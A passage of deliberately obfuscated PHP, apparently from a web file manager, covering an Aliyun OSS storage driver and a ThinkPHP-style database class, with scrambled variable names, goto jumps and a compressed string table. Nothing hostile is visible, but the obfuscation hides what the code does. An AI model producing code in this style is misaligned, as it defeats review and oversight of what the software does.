(!$a§…½Ÿ´—°) { return $BÛŒŒ’†Â; } $a§…½Ÿ´—° = $a§…½Ÿ´—° < 819200 ? 819200 : ($a§…½Ÿ´—° > 838860800 ? 838860800 : $a§…½Ÿ´—°); $BÛŒŒ’†Â[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($a§…½Ÿ´—°); goto eÖÕòñ°á; eÖÕòñ°á: return $BÛŒŒ’†Â; goto c·„‚¯Şù; Eé÷Î°‚õ: $CİïÀ»¯“Ò =& $_SERVER[Ö]; if ($D‡İàñ¸‰á == $CİïÀ»¯“Ò[1182] && $this->isUploadServer() || $D‡İàñ¸‰á == $CİïÀ»¯“Ò[104] && $this->isFileOutServer()) { return $BÛŒŒ’†Â; } $a§…½Ÿ´—° = floatval($GLOBALS[$CİïÀ»¯“Ò[6]][$CİïÀ»¯“Ò[84]][$CİïÀ»¯“Ò[102]][$D‡İàñ¸‰á]) * 1024 * 1024 * 8; goto DŸß œßÅ; c·„‚¯Şù: } public function link($bİÀ¤ÄÀ×÷, $eøŸøòÁ†† = array()) { $cÏÇÎÂÏÃ =& $_SERVER[Ö]; if (!$this->exist($bİÀ¤ÄÀ×÷) || $this->isFolder($bİÀ¤ÄÀ×÷)) { return !1; } try { $eøŸøòÁ†† = $this->trafficLimit($cÏÇÎÂÏÃ[104], $eøŸøòÁ††); $BÉÁå§ìš = $this->client->signUrl($this->bucket, $this->pathEncode($bİÀ¤ÄÀ×÷), 3600 * 12, $cÏÇÎÂÏÃ[212], $eøŸøòÁ††); return $this->getCdnLink($BÉÁå§ìš); } catch (OSS\Core\OssException $b¡‚ĞÃéâä) { return !1; } } public function fileOut($CŞ‰ŠçÍæñ, $b‘šÕÁ’Ë = false, $D†¤±íŒ¦² = false, $cÕÕšë…À‘ = '') { goto F‘åô›Ú²ø; BÉğá—Š: $this->fileOutLink($AƒÙŸè»‚); goto e÷ƒ³àìğ’; d§®Ÿò¦Ÿ÷: $B»£ªï¬»µ = array(OSS\OssClient::OSS_SUB_RESOURCE => $Cíô—ÁÚØ[1194] . rawurlencode("{$b‘šÕÁ’Ë}\x3b\146\151\x6c\x65\x6e\x61\x6d\x65\75{$D†¤±íŒ¦²}")); $B»£ªï¬»µ[OSS\OssClient::OSS_SUB_RESOURCE] .= $Cíô—ÁÚØ[1195] . rawurlencode($Bõ•áÃ); $AƒÙŸè»‚ = $this->link($CŞ‰ŠçÍæñ, $B»£ªï¬»µ); goto BÉğá—Š; F‘åô›Ú²ø: $Cíô—ÁÚØ =& $_SERVER[Ö]; if (!$D†¤±íŒ¦²) { $D†¤±íŒ¦² = $this->pathThis($CŞ‰ŠçÍæñ); } $D†¤±íŒ¦² = rawurlencode($D†¤±íŒ¦²); goto DÂòäîÕï; DÂòäîÕï: $Bõ•áÃ = get_file_mime(get_path_ext($D†¤±íŒ¦²)); if ($Bõ•áÃ == $Cíô—ÁÚØ[197]) { return parent::fileOut($CŞ‰ŠçÍæñ, $b‘šÕÁ’Ë, $D†¤±íŒ¦², $cÕÕšë…À‘); } $b‘šÕÁ’Ë = $b‘šÕÁ’Ë ? $Cíô—ÁÚØ[198] : $Cíô—ÁÚØ[199]; goto d§®Ÿò¦Ÿ÷; e÷ƒ³àìğ’: } public function fileOutServer($C¾½”ğ†×, $Eù™‡Ğ® = false, $DÅŒ¼´†³ = false, $CêÁ©Õôº² = '') { parent::fileOut($C¾½”ğ†×, $Eù™‡Ğ®, $DÅŒ¼´†³, $CêÁ©Õôº²); } public function fileOutImage($bß‡ï· ø, $E‹ÆÒÊÚÖö = 250) { $eŠ°†ã·âÎ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[Ö][1196] . $E‹ÆÒÊÚÖö); $C”ë†«†İ± = $this->link($bß‡ï· ø, $eŠ°†ã·âÎ); $this->fileOutLink($C”ë†«†İ±); } public function fileOutImageServer($cßßï¿ÚâÓ, $D¼Ø¸—³ÎØ = 250) { parent::fileOutImage($cßßï¿ÚâÓ, $D¼Ø¸—³ÎØ); } public function fileOutLink($dÕ´ĞÍêŠè) { $d‰öéªœ­À =& $_SERVER[Ö]; if (!$this->isCdnHost() && substr($dÕ´ĞÍêŠè, 0, 7) == $d‰öéªœ­À[1101]) { $dÕ´ĞÍêŠè = $d‰öéªœ­À[1102] . substr($dÕ´ĞÍêŠè, 7); } header($d‰öéªœ­À[152] . $dÕ´ĞÍêŠè); die; } public function hashMd5($c ß¿¸¶½Ó, $AïÅ…Ó„é = '') { $Eê÷ˆîòÅ =& $_SERVER[Ö]; $B—Ô”Š„ËÅ = $this->objectMeta($c ß¿¸¶½Ó); if (!$B—Ô”Š„ËÅ) { return $Eê÷ˆîòÅ[33]; } if (!isset($B—Ô”Š„ËÅ[$Eê÷ˆîòÅ[1169]]) && !empty($AïÅ…Ó„é)) { $cÖëõÙ = $this->updateObjMeta($c ß¿¸¶½Ó, array($Eê÷ˆîòÅ[1169] => $AïÅ…Ó„é)); $B—Ô”Š„ËÅ[$Eê÷ˆîòÅ[1169]] = $cÖëõÙ ? $AïÅ…Ó„é : $Eê÷ˆîòÅ[33]; } return isset($B—Ô”Š„ËÅ[$Eê÷ˆîòÅ[1169]]) ? strtolower($B—Ô”Š„ËÅ[$Eê÷ˆîòÅ[1169]]) : $Eê÷ˆîòÅ[33]; } public function size($DÀ††®‹·ê) { $aŞß‹Œ’¦í = $this->objectMeta($DÀ††®‹·ê); return $aŞß‹Œ’¦í ? $aŞß‹Œ’¦í[$_SERVER[Ö][77]] : 0; } public function info($Dªìô¨ì‘½) { if ($this->isFolder($Dªìô¨ì‘½)) { return $this->folderInfo($Dªìô¨ì‘½); } else { if ($this->isFile($Dªìô¨ì‘½)) { return $this->fileInfo($Dªìô¨ì‘½); } } return !1; } public function exist($a¬¯¾†) { return $this->isFile($a¬¯¾†) || $this->isFolder($a¬¯¾†); } public function isFile($FÎ¯¬‰ñŠ) { return !$this->isFolder($FÎ¯¬‰ñŠ) && $this->objectMeta($FÎ¯¬‰ñŠ); } public function isFolder($dÈ„ô¨ä×ò) { return $this->cacheMethod($_SERVER[Ö][219], $dÈ„ô¨ä×ò); } protected function objectMeta($e§Öàõ¾ì¯) { return $this->cacheMethod($_SERVER[Ö][220], $e§Öàõ¾ì¯); } protected function _objectMeta($E‘ãç­øØ) { $d°á‹È‚Ï­ =& $_SERVER[Ö]; try { $Eöï‚—¾„ù = $this->client->getObjectMeta($this->bucket, $this->pathEncode($E‘ãç­øØ)); } catch (OSS\Core\OssException $dëÓáÎ¨Éğ) { $Eöï‚—¾„ù = !1; } if ($Eöï‚—¾„ù) { $Eöï‚—¾„ù[$d°á‹È‚Ï­[77]] = intval($Eöï‚—¾„ù[$d°á‹È‚Ï­[1176]]); } return $Eöï‚—¾„ù; } protected function _isFolder($F¹¯¼È–ãÔ) { $DÄ³øîñ£ =& $_SERVER[Ö]; if ($F¹¯¼È–ãÔ == $DÄ³øîñ£[33] || $F¹¯¼È–ãÔ == $DÄ³øîñ£[8]) { return !0; } $D†µÈÏ‚Ì = array($DÄ³øîñ£[1166] => $DÄ³øîñ£[8], $DÄ³øîñ£[182] => rtrim($F¹¯¼È–ãÔ, $DÄ³øîñ£[8]) . $DÄ³øîñ£[8], $DÄ³øîñ£[1167] => 1, $DÄ³øîñ£[1168] => $DÄ³øîñ£[33]); $Cõ©âƒ­Ã¨ = $this->client->listObjects($this->bucket, $D†µÈÏ‚Ì); if ($Cõ©âƒ­Ã¨->getObjectList() || $Cõ©âƒ­Ã¨->getPrefixList()) { return !0; } return !1; } } goto eğÕİÌ•ŸÜ; fƒ‰é¦ßÄß: $eèÒ÷ãß±õ = $_SERVER[Ö][543]; $_SERVER[¸‹ï‰«Ğ] = explode($_SERVER[Ö][544], gzinflate(substr($_SERVER[Ö][545], 10, -8))); $A­«‡„ß² = $_SERVER[Ö][546]; goto eÇ·­Ğ; b›¥ëÏ¸Ÿ: class DbSqlite3 extends DbSqlite3Base { public function query($DÏóŒ›‹‘») { goto AÑ›ÂÁ¨¨; D½ÙÙÀÇºÀ: if (!$FáÔÆÈ•ËÔ) { return !1; } if (flock($FáÔÆÈ•ËÔ, LOCK_EX)) { $E®ËÏö…ÊÍ = parent::query($DÏóŒ›‹‘»); flock($FáÔÆÈ•ËÔ, LOCK_UN); fclose($FáÔÆÈ•ËÔ); return $E®ËÏö…ÊÍ; } flock($FáÔÆÈ•ËÔ, LOCK_UN); goto Dªğ‰¨“µ³; Dªğ‰¨“µ³: fclose($FáÔÆÈ•ËÔ); show_json($aÔŸºƒø ‘[869], !1); return !1; goto E‹¶Îõ®â; AÑ›ÂÁ¨¨: $aÔŸºƒø ‘ =& $_SERVER[Ö]; $fáïƒæöñ = DATA_PATH . $aÔŸºƒø ‘[867]; $FáÔÆÈ•ËÔ = fopen($fáïƒæöñ, $aÔŸºƒø ‘[868]); goto D½ÙÙÀÇºÀ; E‹¶Îõ®â: } public function execute($eÈ¾ÚÓ«ïÂ) { goto C‘ÇŸêÈ“; C‘ÇŸêÈ“: $AØ¿ÁÍ„ß‰ =& $_SERVER[Ö]; $cØÚŒåŸ‹ = DATA_PATH . $AØ¿ÁÍ„ß‰[867]; $aÈÅÕó¿‹ = fopen($cØÚŒåŸ‹, $AØ¿ÁÍ„ß‰[868]); goto AĞ‹Ïà»‘; AĞ‹Ïà»‘: if (!$aÈÅÕó¿‹) { return !1; } if (flock($aÈÅÕó¿‹, LOCK_EX)) { $DÈ—ñÍğÕ = parent::execute($eÈ¾ÚÓ«ïÂ); flock($aÈÅÕó¿‹, LOCK_UN); fclose($aÈÅÕó¿‹); return $DÈ—ñÍğÕ; } flock($aÈÅÕó¿‹, LOCK_UN); goto a„È±ˆˆ; a„È±ˆˆ: fclose($aÈÅÕó¿‹); show_json($AØ¿ÁÍ„ß‰[869], !1); return !1; goto b­î¼Ö; b­î¼Ö: } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\x68\151\x6e\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\x65\x71" => "\75", "\156\145\x71" => "\74\76", "\x67\x74" => "\76", "\145\147\x74" => "\76\x3d", "\154\x74" => "\74", "\x65\154\164" => "\x3c\x3d", "\156\x6f\x74\x6c\151\153\145" => "\116\x4f\124\40\114\x49\113\x45", "\x6c\x69\153\145" => "\x4c\111\x4b\105", "\x69\156" => "\111\116", "\156\x6f\x74\x69\156" => "\116\117\124\40\111\116", "\156\x6f\164\x20\x69\x6e" => "\116\x4f\124\x20\111\116", "\142\x65\164\167\145\x65\156" => "\102\105\x54\x57\x45\105\x4e", "\x6e\157\x74\142\145\164\167\145\x65\x6e" => "\116\x4f\x54\x20\x42\x45\x54\x57\x45\105\x4e", "\x6e\157\164\x20\142\x65\164\167\x65\145\156" => "\x4e\117\x54\40\102\105\124\x57\x45\105\116"); protected $selectSql = "\123\105\114\x45\x43\x54\45\x44\x49\123\124\x49\116\x43\124\45\40\x25\x46\x49\x45\x4c\104\45\40\x46\122\117\x4d\40\x25\x54\101\x42\114\x45\x25\45\112\x4f\111\x4e\x25\45\127\x48\x45\x52\105\45\x25\107\122\x4f\x55\x50\x25\45\x48\x41\x56\x49\x4e\107\x25\45\117\122\x44\x45\122\45\x25\114\111\x4d\x49\x54\x25\40\45\125\116\x49\117\x4e\x25\x25\x43\117\x4d\x4d\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $fóó•÷ñĞĞ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[Ö][870], $fóó•÷ñĞĞ); } public function factory($a§£¡†»œ¼ = '') { goto b‡Œ÷“ˆñğ; d­ÑÈ°—œ: return $fõ£†Şõš; goto b«Àò‚ÂÜí; a§Ö—Î’¨: $this->dbType = ucwords(strtolower($a§£¡†»œ¼[$dÖÛõøÛ‡[871]])); $dƒÛ‘ãä¤  = $dÖÛõøÛ‡[873] . $this->dbType; if (class_exists($dƒÛ‘ãä¤ )) { $fõ£†Şõš = new $dƒÛ‘ãä¤ ($a§£¡†»œ¼); if ($dÖÛõøÛ‡[717] != strtolower($a§£¡†»œ¼[$dÖÛõøÛ‡[871]])) { $fõ£†Şõš->dbType = strtoupper($this->dbType); } else { $fõ£†Şõš->dbType = $this->_getDsnType($a§£¡†»œ¼[$dÖÛõøÛ‡[823]]); } } else { think_exception(think_lang($dÖÛõøÛ‡[874]) . $dÖÛõøÛ‡[875] . $dƒÛ‘ãä¤ ); } goto d­ÑÈ°—œ; b‡Œ÷“ˆñğ: $dÖÛõøÛ‡ =& $_SERVER[Ö]; $a§£¡†»œ¼ = $this->parseConfig($a§£¡†»œ¼); if (empty($a§£¡†»œ¼[$dÖÛõøÛ‡[871]])) { think_exception(think_lang($dÖÛõøÛ‡[872])); } goto a§Ö—Î’¨; b«Àò‚ÂÜí: } public function __call($Eˆ‚Á˜Ó‹, $Cé·•¦ ÙÈ) { if (method_exists($this, $Eˆ‚Á˜Ó‹)) { return call_user_func_array(array($this, $Eˆ‚Á˜Ó‹), $Cé·•¦ ÙÈ); } } protected function _getDsnType($DŸ‡çÄ¸à) { $b©œÖÑ„“ = explode($_SERVER[Ö][4], $DŸ‡çÄ¸à); $c°Ï¿“âğ = strtoupper(trim($b©œÖÑ„“[0])); return $c°Ï¿“âğ; } private function parseConfig($d­¯‡‘½±ö = '') { $DµÆ¹ê‚Õ… =& $_SERVER[Ö]; if (!empty($d­¯‡‘½±ö) && is_string($d­¯‡‘½±ö)) { $d­¯‡‘½±ö = $this->parseDSN($d­¯‡‘½±ö); } elseif (is_array($d­¯‡‘½±ö)) { $d­¯‡‘½±ö = array_change_key_case($d­¯‡‘½±ö); $d­¯‡‘½±ö = array($DµÆ¹ê‚Õ…[871] => $d­¯‡‘½±ö[$DµÆ¹ê‚Õ…[716]], $DµÆ¹ê‚Õ…[796] => $d­¯‡‘½±ö[$DµÆ¹ê‚Õ…[876]], $DµÆ¹ê‚Õ…[797] => $d­¯‡‘½±ö[$DµÆ¹ê‚Õ…[877]], $DµÆ¹ê‚Õ…[794] => $d­¯‡‘½±ö[$DµÆ¹ê‚Õ…[878]], $DµÆ¹ê‚Õ…[795] => $d­¯‡‘½±ö[$DµÆ¹ê‚Õ…[879]], $DµÆ¹ê‚Õ…[17] => $d­¯‡‘½±ö[$DµÆ¹ê‚Õ…[880]], $DµÆ¹ê‚Õ…[823] => $d­¯‡‘½±ö[$DµÆ¹ê‚Õ…[718]], $DµÆ¹ê‚Õ…[13] => isset($d­¯‡‘½±ö[$DµÆ¹ê‚Õ…[881]]) ? $d­¯‡‘½±ö[$DµÆ¹ê‚Õ…[881]] : array()); } elseif (empty($d­¯‡‘½±ö)) { if (think_config($DµÆ¹ê‚Õ…[882]) && $DµÆ¹ê‚Õ…[717] != strtolower(think_config($DµÆ¹ê‚Õ…[883]))) { $d­¯‡‘½±ö = $this->parseDSN(think_config($DµÆ¹ê‚Õ…[882])); } else { $d­¯‡‘½±ö = array($DµÆ¹ê‚Õ…[871] => think_config($DµÆ¹ê‚Õ…[883]), $DµÆ¹ê‚Õ…[796] => think_config($DµÆ¹ê‚Õ…[884]), $DµÆ¹ê‚Õ…[797] => think_config($DµÆ¹ê‚Õ…[885]), $DµÆ¹ê‚Õ…[794] => think_config($DµÆ¹ê‚Õ…[886]), $DµÆ¹ê‚Õ…[795] => think_config($DµÆ¹ê‚Õ…[887]), $DµÆ¹ê‚Õ…[17] => think_config($DµÆ¹ê‚Õ…[230]), $DµÆ¹ê‚Õ…[823] => think_config($DµÆ¹ê‚Õ…[882]), $DµÆ¹ê‚Õ…[13] => think_config($DµÆ¹ê‚Õ…[888])); } } return $d­¯‡‘½±ö; } protected function initConnect($Eæ¬Âæ­ô = true) { if (1 == think_config($_SERVER[Ö][18])) { $this->_linkID = $this->multiConnect($Eæ¬Âæ­ô); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($EÁË¨˜ïÄ† = false) { $eÛÀàéÀŠ =& $_SERVER[Ö]; static $E™´æƒ®¹ = array(); if (empty($E™´æƒ®¹)) { foreach ($this->config as $c–ß½â¨Œæ => $câÉšÂ¢ÜÓ) { $E™´æƒ®¹[$c–ß½â¨Œæ] = explode($eÛÀàéÀŠ[47], $câÉšÂ¢ÜÓ); } } if (think_config($eÛÀàéÀŠ[889])) { if ($EÁË¨˜ïÄ†) { $dßÊ¡÷ŸÒ = floor(mt_rand(0, think_config($eÛÀàéÀŠ[890]) - 1)); } else { if (is_numeric(think_config($eÛÀàéÀŠ[891]))) { $dßÊ¡÷ŸÒ = think_config($eÛÀàéÀŠ[891]); } else { $dßÊ¡÷ŸÒ = floor(mt_rand(think_config($eÛÀàéÀŠ[890]), count($E™´æƒ®¹[$eÛÀàéÀŠ[794]]) - 1)); } } } else { $dßÊ¡÷ŸÒ = floor(mt_rand(0, count($E™´æƒ®¹[$eÛÀàéÀŠ[794]]) - 1)); } $c’æ‡æ¸Î = array($eÛÀàéÀŠ[796] => isset($E™´æƒ®¹[$eÛÀàéÀŠ[796]][$dßÊ¡÷ŸÒ]) ? $E™´æƒ®¹[$eÛÀàéÀŠ[796]][$dßÊ¡÷ŸÒ] : $E™´æƒ®¹[$eÛÀàéÀŠ[796]][0], $eÛÀàéÀŠ[797] => isset($E™´æƒ®¹[$eÛÀàéÀŠ[797]][$dßÊ¡÷ŸÒ]) ? $E™´æƒ®¹[$eÛÀàéÀŠ[797]][$dßÊ¡÷ŸÒ] : $E™´æƒ®¹[$eÛÀàéÀŠ[797]][0], $eÛÀàéÀŠ[794] => isset($E™´æƒ®¹[$eÛÀàéÀŠ[794]][$dßÊ¡÷ŸÒ]) ? $E™´æƒ®¹[$eÛÀàéÀŠ[794]][$dßÊ¡÷ŸÒ] : $E™´æƒ®¹[$eÛÀàéÀŠ[794]][0], $eÛÀàéÀŠ[795] => isset($E™´æƒ®¹[$eÛÀàéÀŠ[795]][$dßÊ¡÷ŸÒ]) ? $E™´æƒ®¹[$eÛÀàéÀŠ[795]][$dßÊ¡÷ŸÒ] : $E™´æƒ®¹[$eÛÀàéÀŠ[795]][0], $eÛÀàéÀŠ[17] => isset($E™´æƒ®¹[$eÛÀàéÀŠ[17]][$dßÊ¡÷ŸÒ]) ? $E™´æƒ®¹[$eÛÀàéÀŠ[17]][$dßÊ¡÷ŸÒ] : $E™´æƒ®¹[$eÛÀàéÀŠ[17]][0], $eÛÀàéÀŠ[823] => isset($E™´æƒ®¹[$eÛÀàéÀŠ[823]][$dßÊ¡÷ŸÒ]) ? $E™´æƒ®¹[$eÛÀàéÀŠ[823]][$dßÊ¡÷ŸÒ] : $E™´æƒ®¹[$eÛÀàéÀŠ[823]][0], $eÛÀàéÀŠ[13] => isset($E™´æƒ®¹[$eÛÀàéÀŠ[13]][$dßÊ¡÷ŸÒ]) ? $E™´æƒ®¹[$eÛÀàéÀŠ[13]][$dßÊ¡÷ŸÒ] : $E™´æƒ®¹[$eÛÀàéÀŠ[13]][0]); return $this->connect($c’æ‡æ¸Î, $dßÊ¡÷ŸÒ); } public function parseDSN($e÷Ü¨îƒ“‚) { $dÏ×Ô÷Ü‚‹ =& $_SERVER[Ö]; if (empty($e÷Ü¨îƒ“‚)) { return !1; } $bòêØÁÜ¨ = parse_url($e÷Ü¨îƒ“‚); if ($bòêØÁÜ¨[$dÏ×Ô÷Ü‚‹[164]]) { $DßŒÖÎîšÛ = array($dÏ×Ô÷Ü‚‹[871] => $bòêØÁÜ¨[$dÏ×Ô÷Ü‚‹[164]], $dÏ×Ô÷Ü‚‹[796] => isset($bòêØÁÜ¨[$dÏ×Ô÷Ü‚‹[531]]) ? $bòêØÁÜ¨[$dÏ×Ô÷Ü‚‹[531]] : $dÏ×Ô÷Ü‚‹[33], $dÏ×Ô÷Ü‚‹[797] => isset($bòêØÁÜ¨[$dÏ×Ô÷Ü‚‹[892]]) ? $bòêØÁÜ¨[$dÏ×Ô÷Ü‚‹[892]] : $dÏ×Ô÷Ü‚‹[33], $dÏ×Ô÷Ü‚‹[794] => isset($bòêØÁÜ¨[$dÏ×Ô÷Ü‚‹[165]]) ? $bòêØÁÜ¨[$dÏ×Ô÷Ü‚‹[165]] : $dÏ×Ô÷Ü‚‹[33], $dÏ×Ô÷Ü‚‹[795] => isset($bòêØÁÜ¨[$dÏ×Ô÷Ü‚‹[166]]) ? $bòêØÁÜ¨[$dÏ×Ô÷Ü‚‹[166]] : $dÏ×Ô÷Ü‚‹[33], $dÏ×Ô÷Ü‚‹[17] => isset($bòêØÁÜ¨[$dÏ×Ô÷Ü‚‹[75]]) ? substr($bòêØÁÜ¨[$dÏ×Ô÷Ü‚‹[75]], 1) : $dÏ×Ô÷Ü‚‹[33]); } else { preg_match($dÏ×Ô÷Ü‚‹[893], trim($e÷Ü¨îƒ“‚), $AèÇÒ©Š¤); $DßŒÖÎîšÛ = array($dÏ×Ô÷Ü‚‹[871] => $AèÇÒ©Š¤[1], $dÏ×Ô÷Ü‚‹[796] => $AèÇÒ©Š¤[2], $dÏ×Ô÷Ü‚‹[797] => $AèÇÒ©Š¤[3], $dÏ×Ô÷Ü‚‹[794] => $AèÇÒ©Š¤[4], $dÏ×Ô÷Ü‚‹[795] => $AèÇÒ©Š¤[5], $dÏ×Ô÷Ü‚‹[17] => $AèÇÒ©Š¤[6]); } $DßŒÖÎîšÛ[$dÏ×Ô÷Ü‚‹[823]] = $dÏ×Ô÷Ü‚‹[33]; return $DßŒÖÎîšÛ; } protected function debug() { $bÀ…ÇÔŞ®£ =& $_SERVER[Ö]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $bÀ…ÇÔŞ®£[894]; if (think_config($bÀ…ÇÔŞ®£[895])) { think_status($bÀ…ÇÔŞ®£[896]); think_trace($this->queryStr . $bÀ…ÇÔŞ®£[897] . think_status($bÀ…ÇÔŞ®£[20], $bÀ…ÇÔŞ®£[896], 6) . $bÀ…ÇÔŞ®£[898], $bÀ…ÇÔŞ®£[33], $bÀ…ÇÔŞ®£[899]); } } protected function parseLock($AŒ‡”ìè = false) { $F»ƒô¥ĞÆ =& $_SERVER[Ö]; if (!$AŒ‡”ìè) { return $F»ƒô¥ĞÆ[33]; } if ($F»ƒô¥ĞÆ[825] == $this->dbType) { return $F»ƒô¥ĞÆ[900]; } return $F»ƒô¥ĞÆ[901]; } protected function parseSet($e™éŒ¯§ô) { $eÓÌ¤êï±œ =& $_SERVER[Ö]; foreach ($e™éŒ¯§ô as $DÛæåàãÅ‹ => $eä–âà•·˜) { if (is_array($eä–âà•·˜) && $eÓÌ¤êï±œ[281] == $eä–âà•·˜[0]) { $Dîª µŒé[] = $this->parseKey($DÛæåàãÅ‹) . $eÓÌ¤êï±œ[902] . $eä–âà•·˜[1]; } elseif (is_scalar($eä–âà•·˜) || is_null($eä–âà•·˜)) { $Dîª µŒé[] = $this->parseKey($DÛæåàãÅ‹) . $eÓÌ¤êï±œ[902] . $this->parseValue($eä–âà•·˜); } } return $eÓÌ¤êï±œ[903] . implode($eÓÌ¤êï±œ[47], $Dîª µŒé); } protected function bindParam($e×ÆáİÈÓÇ, $f‹Ä‘±—³) { $this->bind[$_SERVER[Ö][4] . $e×ÆáİÈÓÇ] = $f‹Ä‘±—³; } protected function parseBind($bâùŸ²Îï) { $bâùŸ²Îï = array_merge($this->bind, $bâùŸ²Îï); $this->bind = array(); return $bâùŸ²Îï; } function parseKey(&$f¡ÀËÏ©¬†, $BäÎŸ¸†Ï = true) { if ($BäÎŸ¸†Ï) { $f¡ÀËÏ©¬† = $this->parseKeyCheck($f¡ÀËÏ©¬†); } return $f¡ÀËÏ©¬†; } function parseKeyCheck($Eø‘ÆùÖá‚) { $D»¦Ü‰ö§ã =& $_SERVER[Ö]; $Eø‘ÆùÖá‚ = trim($Eø‘ÆùÖá‚); if (!preg_match($D»¦Ü‰ö§ã[904], $Eø‘ÆùÖá‚)) { think_exception($D»¦Ü‰ö§ã[905] . $Eø‘ÆùÖá‚); } return $Eø‘ÆùÖá‚; } protected function parseValue($F¥£ÑÑ¯ÃÍ) { $aÊßÇ½¤ƒŸ =& $_SERVER[Ö]; if (is_string($F¥£ÑÑ¯ÃÍ)) { $F¥£ÑÑ¯ÃÍ = $aÊßÇ½¤ƒŸ[864] . $this->escapeString($F¥£ÑÑ¯ÃÍ) . $aÊßÇ½¤ƒŸ[864]; } elseif (isset($F¥£ÑÑ¯ÃÍ[0]) && is_string($F¥£ÑÑ¯ÃÍ[0]) && strtolower($F¥£ÑÑ¯ÃÍ[0]) == $aÊßÇ½¤ƒŸ[281]) { $F¥£ÑÑ¯ÃÍ = $this->escapeString($F¥£ÑÑ¯ÃÍ[1]); } elseif (is_array($F¥£ÑÑ¯ÃÍ)) { $F¥£ÑÑ¯ÃÍ = array_map(array($this, $aÊßÇ½¤ƒŸ[865]), $F¥£ÑÑ¯ÃÍ); } elseif (is_bool($F¥£ÑÑ¯ÃÍ)) { $F¥£ÑÑ¯ÃÍ = $F¥£ÑÑ¯ÃÍ ? $aÊßÇ½¤ƒŸ[83] : $aÊßÇ½¤ƒŸ[464]; } elseif (is_null($F¥£ÑÑ¯ÃÍ)) { $F¥£ÑÑ¯ÃÍ = $aÊßÇ½¤ƒŸ[99]; } return $F¥£ÑÑ¯ÃÍ; } protected function parseField($dºÓ¼ñÂ¬) { $Cêã˜ƒğ’¶ =& $_SERVER[Ö]; if (is_string($dºÓ¼ñÂ¬) && strpos($dºÓ¼ñÂ¬, $Cêã˜ƒğ’¶[47])) { $dºÓ¼ñÂ¬ = explode($Cêã˜ƒğ’¶[47], $dºÓ¼ñÂ¬); } if (is_array($dºÓ¼ñÂ¬)) { $fñ«”Á¸ä½ = array(); foreach ($dºÓ¼ñÂ¬ as $E”…·ù´•¯ => $E´¦³ªİ‰) { if (!is_numeric($E”…·ù´•¯)) { $fñ«”Á¸ä½[] = $this->parseKey($E”…·ù´•¯) . $Cêã˜ƒğ’¶[906] . $this->parseKey($E´¦³ªİ‰); } else { $fñ«”Á¸ä½[] = $this->parseKey($E´¦³ªİ‰); } } $Ağ…Ä‘¢–Ğ = implode($Cêã˜ƒğ’¶[47], $fñ«”Á¸ä½); } elseif (is_string($dºÓ¼ñÂ¬) && !empty($dºÓ¼ñÂ¬)) { $Ağ…Ä‘¢–Ğ = $dºÓ¼ñÂ¬; } else { $Ağ…Ä‘¢–Ğ = $Cêã˜ƒğ’¶[172]; } return $Ağ…Ä‘¢–Ğ; } protected function parseTable($eº´õØòŒ) { $cÉéÑŠìˆå =& $_SERVER[Ö]; if (is_array($eº´õØòŒ)) { $Bù ½¥¯º‡ = array(); foreach ($eº´õØòŒ as $eÊî´Ü‡” => $E‚¤ğ·¯’Á) { if (!is_numeric($eÊî´Ü‡”)) { $Bù ½¥¯º‡[] = $this->parseKey($eÊî´Ü‡”) . $cÉéÑŠìˆå[50] . $this->parseKey($E‚¤ğ·¯’Á); } else { $Bù ½¥¯º‡[] = $this->parseKey($eÊî´Ü‡”); } } $eº´õØòŒ = $Bù ½¥¯º‡; } elseif (is_string($eº´õØòŒ)) { if (strstr($eº´õØòŒ, $cÉéÑŠìˆå[50])) { return $eº´õØòŒ; } $eº´õØòŒ = explode($cÉéÑŠìˆå[47], $eº´õØòŒ); array_walk($eº´õØòŒ, array($this, $cÉéÑŠìˆå[813])); } return $cÉéÑŠìˆå[907] . trim(implode($cÉéÑŠìˆå[908], $eº´õØòŒ), $cÉéÑŠìˆå[819]) . $cÉéÑŠìˆå[907]; } protected function parseWhere($bÓÑ÷ÊÉÃ ) { $bíâØÊµäğ =& $_SERVER[Ö]; $A…ÙæÒİßĞ = $bíâØÊµäğ[33]; if (is_string($bÓÑ÷ÊÉÃ )) { $A…ÙæÒİßĞ = $bÓÑ÷ÊÉÃ ; } else { $FººïÏÏ… = isset($bÓÑ÷ÊÉÃ [$bíâØÊµäğ[909]]) ? strtoupper($bÓÑ÷ÊÉÃ [$bíâØÊµäğ[909]]) : $bíâØÊµäğ[33]; if (in_array($FººïÏÏ…, array($bíâØÊµäğ[910], $bíâØÊµäğ[911], $bíâØÊµäğ[912]))) { $FººïÏÏ… = $bíâØÊµäğ[50] . $FººïÏÏ… . $bíâØÊµäğ[50]; unset($bÓÑ÷ÊÉÃ [$bíâØÊµäğ[909]]); } else { $FººïÏÏ… = $bíâØÊµäğ[913]; } foreach ($bÓÑ÷ÊÉÃ  as $B¦ŠŠ«ö => $dĞÌŠš¶Ï«) { $A…ÙæÒİßĞ .= $bíâØÊµäğ[261]; if (is_numeric($B¦ŠŠ«ö)) { $B¦ŠŠ«ö = $bíâØÊµäğ[914]; } if (0 === strpos($B¦ŠŠ«ö, $bíâØÊµäğ[70])) { $A…ÙæÒİßĞ .= $this->parseThinkWhere($B¦ŠŠ«ö, $dĞÌŠš¶Ï«); } else { if (!preg_match($bíâØÊµäğ[915], trim($B¦ŠŠ«ö))) { think_exception(think_lang($bíâØÊµäğ[916]) . $bíâØÊµäğ[4] . $B¦ŠŠ«ö); } $AÚÕµÛ•…¾ = is_array($dĞÌŠš¶Ï«) && isset($dĞÌŠš¶Ï«[$bíâØÊµäğ[917]]); $B¦ŠŠ«ö = trim($B¦ŠŠ«ö); if (strpos($B¦ŠŠ«ö, $bíâØÊµäğ[267])) { $fÒƒ–šØŠ = explode($bíâØÊµäğ[267], $B¦ŠŠ«ö); $eíé±¤ù = array(); foreach ($fÒƒ–šØŠ as $aèÃêìÃ‰ó => $AÙóØËÊ¯ë) { $B²¿ÂÄåíæ = $AÚÕµÛ•…¾ ? 